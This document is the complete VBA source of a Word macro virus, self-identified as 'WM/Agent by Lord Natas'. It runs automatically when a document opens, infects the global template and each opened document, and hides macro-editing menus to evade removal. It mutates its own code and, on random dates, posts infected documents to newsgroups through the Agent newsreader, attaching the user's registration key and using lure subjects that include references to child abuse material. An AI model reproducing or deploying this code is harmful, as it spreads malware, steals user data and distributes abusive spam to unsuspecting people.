   Attribute VB_Name = "AutoOpen"

   Dim a$
   Public Sub MAIN()
   Attribute MAIN.VB_Description = "antiVirus 8"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim z
   Dim o
   Dim Rnd1
   Dim Rnd2
   a$ = ""
   On Error Resume Next
   a$ = Chr(60 + 8 - 3) + "utoOpen"
   WordBasic.DisableInput
   If Not IsInstalledInGlobal Then
       If WordBasic.Second(WordBasic.Now()) = 45 Then Mutate (3)
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + a$, a$
       WordBasic.SetProfileString "Compatibility", "ANTIVIRUS", "0xDC9949BB"
       'stupid "stealth"
       '============
       If WordBasic.[MenuItemText$]("&Tools", 0, 13, 0) = "&Macro..." Then
           WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="Tools", _
               Remove:=1, Context:=0
       End If
       If WordBasic.[MenuItemText$]("&Tools", 0, 13, 0) = "&Customize..." Then
           WordBasic.ToolsCustomizeMenus Name:="ToolsCustomize", Menu:="Tools", _
               Remove:=1, Context:=0
       End If
       If WordBasic.[MenuItemText$]("&File", 0, 10, 0) = "&Templates..." Then
           WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="File", _
               Remove:=1, Context:=0
       End If
       If WordBasic.[MenuItemText$]("F&ormat", 0, 14, 0) = "&Style..." Then
           WordBasic.ToolsCustomizeMenus Name:="FormatStyle", Menu:="Format", _
               Remove:=1, Context:=0
       End If
       '============
       z = 16 / 8 - 1 - 1
       WordBasic.ToolsOptionsSave GlobalDotPrompt:=z
       Counter (1)
   End If
   If Not IsInstalledInFile Then
       If WordBasic.Second(WordBasic.Now()) = 23 Then Mutate (1)
       WordBasic.MacroCopy a$, WordBasic.[FileName$]() + ":" + a$
       WordBasic.SetDocumentVar "ANTIVIRUS", "0xDC9949BB"
       o = 4 / 2 - 1
       WordBasic.FileSaveAs Format:=o
       Counter (3)
   End If
   Rnd1 = WordBasic.Int(Rnd() * 31) + 1
   Rnd2 = WordBasic.Int(Rnd() * 60)
   'heh
   If WordBasic.Day(WordBasic.Now()) = Rnd1 And WordBasic.Second(WordBasic.Now()) = Rnd2 Then SendVirus
   End Sub

   Private Sub Counter(c)
   Dim d$
   Dim desc$
   'increment the generation counter
   On Error Resume Next
   d$ = WordBasic.[LTrim$](Str(WordBasic.Val(Mid(WordBasic.[MacroDesc$](a$), 10)) + 1))
   desc$ = "antiVirus " + d$
   WordBasic.ToolsMacro Name:=a$, Show:=c, Description:=desc$, _
       SetDesc:=1
   End Sub

   Private Function IsInstalledInGlobal()
   Dim c$
   'check for the infection mark in win.ini
   c$ = WordBasic.[GetProfileString$]("Compatibility", "ANTIVIRUS")
   If c$ = "0xDC9949BB" Then IsInstalledInGlobal = -1
   End Function

   Private Function IsInstalledInFile()
   Dim c$
   'check for the infection mark in the current doc
   c$ = WordBasic.[GetDocumentVar$]("ANTIVIRUS")
   If c$ = "0xDC9949BB" Then IsInstalledInFile = -1
   End Function

   Private Sub Mutate(w)
   Dim Lines
   Dim LF$
   Dim R
   Dim R_$
   On Error Resume Next
       'minor polymorphism
       WordBasic.ScreenUpdating 0
       WordBasic.ToolsMacro Name:=a$, Edit:=1, Show:=w
       Lines = 0
       'get the total number of lines
       While WordBasic.LineDown()
           Lines = Lines + 1
       Wend
       WordBasic.StartOfDocument
       'go down a random amount
       WordBasic.ParaDown WordBasic.Int(Rnd() * (Lines - 1) + 1)
       LF$ = Chr(13)
       R = Rnd()
       If R < 0.3 Then
           WordBasic.Insert "'" + RGG$ + LF$
       ElseIf R < 0.6 Then
           WordBasic.Insert "REM " + RGG$ + LF$
       ElseIf R < 0.9 Then
           R_$ = RGG$ + "$"
           WordBasic.EditReplace Find:="RGG$", Replace:=R_$, ReplaceAll:=1, _
               Wrap:=1
       Else
           R_$ = RGG$ + "$"
           WordBasic.EditReplace Find:="Rand$", Replace:=R_$, ReplaceAll:=1, _
               Wrap:=1
       End If
       WordBasic.StartOfDocument
       WordBasic.DocClose 1
   End Sub

   Private Function RGG$()
   Dim i
   Dim Rand$
   'random garbage generator - really lame, but it works
   For i = 1 To WordBasic.Int(Rnd() * (30 - 1) + 1)
       If Rnd() > Rnd() Then
           Rand$ = Rand$ + Chr(WordBasic.Int(Rnd() * (122 - 97) + 97))
       Else
           Rand$ = Rand$ + Chr(WordBasic.Int(Rnd() * (90 - 65) + 65))
       End If
   Next
   RGG$ = Rand$
   End Function

   Private Sub SendVirus()
   Dim i
   Dim Temp$
   Dim sName$
   Dim Exe$
   Dim AgentDir$
   Dim INI$
   Dim sKey$
   Dim j
   Dim Ng
   Dim Ng_$
   Dim Subject
   Dim Subject_$
   On Error Resume Next
   WordBasic.DisableInput
   WordBasic.ScreenUpdating 0

   For i = 1 To 8
   Temp$ = Temp$ + Chr(WordBasic.Int(Rnd() * (90 - 65) + 65))
   Next
   sName$ = "C:\" + Temp$ + ".DOC"
   WordBasic.FileSaveAs Name:=sName$

   If WordBasic.AppIsRunning("Agent") Then GoTo More
   Exe$ = "c:\progra~1\agent\agent.exe"
   If WordBasic.[Files$](Exe$) <> "" Then
   'execute agent, if it exists
       AgentDir$ = "c:\progra~1\agent"
       WordBasic.ChDir AgentDir$
       INI$ = AgentDir$ + "\data\agent.ini"
       sKey$ = WordBasic.[GetPrivateProfileString$]("Profile", "Key", INI$)
       WordBasic.Shell Exe$, 1
       'just a delay to let Agent open
       For i = 1 To 100
           For j = 1 To 100
           Next j
       Next i
       GoTo More
   End If
   Exe$ = "c:\agent\agent.exe"
   If WordBasic.[Files$](Exe$) <> "" Then
       AgentDir$ = "c:\agent"
       WordBasic.ChDir AgentDir$
       INI$ = AgentDir$ + "\data\agent.ini"
       sKey$ = WordBasic.[GetPrivateProfileString$]("Profile", "Key", INI$)
       WordBasic.Shell Exe$, 1
       For i = 1 To 100
           For j = 1 To 100
           Next j
       Next i
       GoTo More
   End If
   GoTo NoAgent

   More:
   WordBasic.AppActivate "Agent", 1
   WordBasic.SendKeys "P", -1
   'post new message

   Ng = WordBasic.Int(Rnd() * 23)

   Select Case Ng
   'some "interesting" newsgroups ;)

       Case 0
           Ng_$ = "alt.aol-sucks"
       Case 1
           Ng_$ = "alt.binaries.cracks"
       Case 2
           Ng_$ = "alt.binaries.pictures.erotica"
       Case 3
           Ng_$ = "alt.binaries.warez.ibm-pc"
       Case 4
           Ng_$ = "alt.conspiracy"
       Case 5
           Ng_$ = "alt.drugs.pot"
       Case 6
           Ng_$ = "alt.fan.hanson"
       Case 7
           Ng_$ = "alt.flame"
       Case 8
           Ng_$ = "alt.hacker"
       Case 9
           Ng_$ = "alt.sex"
       Case 10
           Ng_$ = "alt.sex.necrophilia"
       Case 11
           Ng_$ = "alt.sex.stories"
       Case 12
           Ng_$ = "alt.sex.zoophilia"
       Case 13
           Ng_$ = "alt.windows95"
       Case 14
           Ng_$ = "alt.sex.passwords"
       Case 15
           Ng_$ = "alt.binaries.warez"
       Case 16
           Ng_$ = "alt.binaries.sounds.mp3"
       Case 17
           Ng_$ = "alt.comp.virus" '<GRIN>
       Case 18
           Ng_$ = "alt.2600"
       Case 19
           Ng_$ = "alt.2600.hackerz"
       Case 20
           Ng_$ = "alt.skinheads"
       Case 21
           Ng_$ = "alt.sex.babies"
       Case 22
           Ng_$ = "alt.sex.bondage"

   End Select

   WordBasic.SendKeys "%r", -1     'alt-r==newsgroup
   WordBasic.SendKeys Ng_$, -1     'newsgroup name

   Subject = WordBasic.Int(Rnd() * 21)

   Select Case Subject
   '...and here are some interesting subjects ;)

       Case 0
           Subject_$ = "Free XXX Passwords"
       Case 1
           Subject_$ = "Check this out!"
       Case 2
           Subject_$ = "Official WaReZ site list"
       Case 3
           Subject_$ = "Easy Money!"
       Case 4
           Subject_$ = "My first fuck by Todd"
       Case 5
           Subject_$ = "Hanson rulez!"
       Case 6
           Subject_$ = "Warez mailing list details"
       Case 7
           Subject_$ = "Crackz mailing list details"
       Case 8
           Subject_$ = "Learn to hack!"
       Case 9
           Subject_$ = "Attn: All k3wl h4ck3rz"
       Case 10
           Subject_$ = "Important Info"
       Case 11
           Subject_$ = "New Virus Alert!"
       Case 12
           Subject_$ = "Serial Number List!"
       Case 13
           Subject_$ = "Official mp3 site list"
       Case 14
           Subject_$ = "Elite XXX site list"
       Case 15
           Subject_$ = "New erotic story"
       Case 16
           Subject_$ = "Important Princess Diana Info"
       Case 17
           Subject_$ = "Important Monica Lewinsky Info"
       Case 18
           Subject_$ = "How to find child pornography"
       Case 19
           Subject_$ = "Cable TV descrambler instructions!"
       Case 20
           Subject_$ = "Kewl N64 Emulator & MP3 sites"

   End Select

   WordBasic.SendKeys "%b", -1
   WordBasic.SendKeys Subject_$, -1

   'message body
   WordBasic.SendKeys "%x", -1
   WordBasic.SendKeys "WM/Agent by Lord Natas", -1
   'garbage bytes for confusion
   WordBasic.SendKeys RGG$, -1
   If sKey$ <> "" Then
       WordBasic.SendKeys "{enter}", -1
       WordBasic.SendKeys sKey$, -1
   End If

   'encode above message with ROT13
   WordBasic.SendKeys "^A", -1
   WordBasic.SendKeys "^3", -1

   'go to the attachments dialog
   WordBasic.SendKeys "%A", -1
   WordBasic.SendKeys "%A", -1

   'add our attchment
   WordBasic.SendKeys sName$, -1
   WordBasic.SendKeys "{enter}", -1
   WordBasic.SendKeys "{enter}", -1

   'post the message - hopfully the user is connected
   WordBasic.SendKeys "^n", -1

   NoAgent:
   End Sub
